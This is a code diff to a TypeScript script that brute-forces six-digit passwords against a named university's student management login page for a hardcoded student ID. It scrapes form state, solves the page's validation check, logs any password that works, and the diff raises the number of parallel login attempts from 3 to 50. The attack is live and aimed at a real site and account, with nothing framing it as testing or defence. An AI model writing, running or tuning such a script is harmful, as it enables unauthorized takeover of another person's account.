@@ -5,15 +5,16 @@ import cheerio from "cheerio"
 const log = console.log
 const baseUrl = "http://mis.sse.ustc.edu.cn/"
 const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g
-
+let success = false
 let view_state = ""
 let username = "sa18225541"
 let password = "000000"
 const app =()=>{
+  const mypass = password
   fetch(baseUrl)
   .then(
     async result => {
-      if(parseInt(password)>999999){
+      if(parseInt(password)>999999||success){
         return
       }
     const cookieJar:string[] = []
@@ -44,7 +45,7 @@ const app =()=>{
     formData.append("__EVENTTARGET","winLogin$sfLogin$ContentPanel1$btnLogin")
     formData.append("__VIEWSTATE",view_state)
     formData.append("winLogin$sfLogin$txtUserLoginID",username)
-    formData.append('winLogin$sfLogin$txtPassword',password)
+    formData.append('winLogin$sfLogin$txtPassword',mypass)
     formData.append('winLogin$sfLogin$txtValidate',sum)
     // formData.append("__EVENTARGUMENT","")
     // formData.append("X_CHANGED","true")
@@ -70,12 +71,13 @@ const app =()=>{
     })
     const iflysse = (login.headers.get("set-cookie")||"").split(";")[0]
   if(iflysse.length === 0 ){
-    log("failed ","password: ", password)
+    log("failed ","password: ", mypass)
     increase()
     cookieJar.length = 0
     app()
   }else{
-    log("success ","用户名: ",username,"密码: ",password)
+    log("success ","用户名: ",username,"密码: ",mypass)
+    success = true
     return
   }
   cookieJar.push(iflysse)
@@ -96,7 +98,7 @@ function increase(){
   }
 }
 
-for(let i=0;i<3;i++){
+for(let i=0;i<50;i++){
   app()
   increase()
 }
